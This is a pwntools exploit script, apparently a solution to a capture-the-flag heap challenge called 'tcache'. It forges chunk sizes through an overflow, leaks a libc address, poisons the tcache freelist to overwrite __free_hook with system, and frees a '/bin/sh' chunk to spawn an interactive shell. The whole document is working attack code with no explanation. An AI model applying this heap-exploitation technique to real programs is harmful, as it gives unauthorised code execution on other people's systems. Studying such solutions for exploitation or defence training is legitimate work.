from pwn import *


local = 1
p = process('./tcache')
context.log_level = 'debug'

def launch_gdb():
    if local != 1:
        return
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def add(s):
    p.recvuntil('----------menu----------')
    p.sendline('1')
    p.recvuntil('content:')
    p.send(s)

def edit(i,s):
    p.recvuntil('----------menu----------')
    p.sendline('2')
    p.recvuntil('string:')
    p.sendline(str(i))
    p.recvuntil('content:')
    p.send(s)

def dele(i):
    p.recvuntil('----------menu----------')
    p.sendline('3')
    p.recvuntil('string:')
    p.sendline(str(i))

def show(i):
    p.recvuntil('----------menu----------')
    p.sendline('4')
    p.recvuntil('string:')
    p.sendline(str(i))
for _ in xrange(19):
    add('aaa')
edit(0,'a'*48 + p64(0x65) + p64(0x40*17 + 1))
dele(1)
edit(0,'a'*64)
show(0)
p.recvuntil('a'*64)
leak = u64(p.recv(6)+'\x00\x00')
log.info('leak libc ' + hex(leak))

libc_base = leak - 4111520
free_hook = 4118760 + libc_base
sys_addr = 324832 + libc_base
edit(0,'a'*48 + p64(0x65) + p64(0x40*17 + 1))
add('aaa')
add('aaa')
dele(3)
dele(4)
dele(2)
edit(19,p64(free_hook))
add(p64(sys_addr))
add(p64(sys_addr))

edit(10,'/bin/sh\x00')
dele(10)

p.interactive()